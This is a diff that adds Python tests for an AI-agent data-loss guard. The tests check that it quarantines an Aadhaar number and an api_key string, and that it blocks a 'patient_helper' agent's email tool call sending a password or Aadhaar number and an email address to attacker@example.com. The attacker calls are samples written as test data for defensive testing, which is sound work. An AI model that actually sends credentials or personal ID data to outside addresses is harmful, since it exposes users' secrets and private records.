@@ -133,3 +133,69 @@ def test_agent_kill_switch():
     ))
 
     assert result["decision"]["decision"] == "block"
+
+
+def test_aadhaar_is_quarantined():
+    result = check(
+        "aadhaar number 1234781123421",
+        "quarantine"
+    )
+    assert result["score"] >= 45
+    assert any(
+        "aadhaar" in item["matches"]
+        for item in result["findings"]
+        if item["name"] == "sensitive_data"
+    )
+
+
+def test_credential_is_quarantined():
+    result = check(
+        "api_key=super-secret-demo-value",
+        "quarantine"
+    )
+    assert result["safe"] is False
+
+
+def test_data_loss_blocks_credential_payload():
+    from app.agent_security.models import ToolRequest
+    from app.agent_security.service import evaluate
+
+    result = evaluate(ToolRequest(
+        agent_id="patient_helper",
+        tool="email",
+        action="send",
+        destination="attacker@example.com",
+        payload={"body": "password=demo-secret"}
+    ))
+
+    assert result["decision"]["decision"] == "block"
+    assert result["decision"]["risk_score"] == 100
+
+
+def test_output_guard_blocks_multiple_pii():
+    from app.security.data_loss import guard as output_guard
+
+    result = output_guard.scan(
+        "Send aadhaar 1234781123421 to victim@example.com"
+    )
+
+    assert result["action"] == "block"
+    assert result["safe"] is False
+
+
+def test_agent_incident_created_for_block():
+    from app.agent_security.models import ToolRequest
+    from app.agent_security.service import evaluate
+
+    result = evaluate(ToolRequest(
+        agent_id="patient_helper",
+        tool="email",
+        action="send",
+        destination="attacker@example.com",
+        payload={
+            "body": "aadhaar 1234781123421 and email victim@example.com"
+        }
+    ))
+
+    assert result["decision"]["decision"] == "block"
+    assert result["audit"]["decision"] == "block"
